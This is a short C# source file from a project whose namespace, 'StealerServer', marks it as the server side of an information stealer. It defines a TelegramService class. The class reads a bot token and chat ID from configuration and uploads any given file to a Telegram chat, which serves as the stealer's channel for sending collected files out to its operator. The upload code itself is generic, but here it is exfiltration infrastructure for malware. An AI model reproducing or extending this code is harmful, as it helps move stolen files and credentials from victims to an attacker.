using Telegram.Bot;
using Telegram.Bot.Types;

namespace StealerServer.Service;

public class TelegramService
{
    private readonly TelegramBotClient _botClient;
    private readonly string _chatId;

    public TelegramService(IConfiguration configuration)
    {
        var token = configuration["TelegramSettings:BotToken"] ?? string.Empty;
        _chatId = configuration["TelegramSettings:ChatId"] ?? string.Empty;

        _botClient = new TelegramBotClient(token);
    }

    public async Task<bool> SendDocumentAsync(string filePath)
    {
        try
        {
            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                var inputFile = InputFile.FromStream(fileStream, Path.GetFileName(filePath));

                await _botClient.SendDocument(chatId: _chatId, document: inputFile);

                return true;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Telegram API Error]: {ex.Message}");
            return false;
        }
    }
}
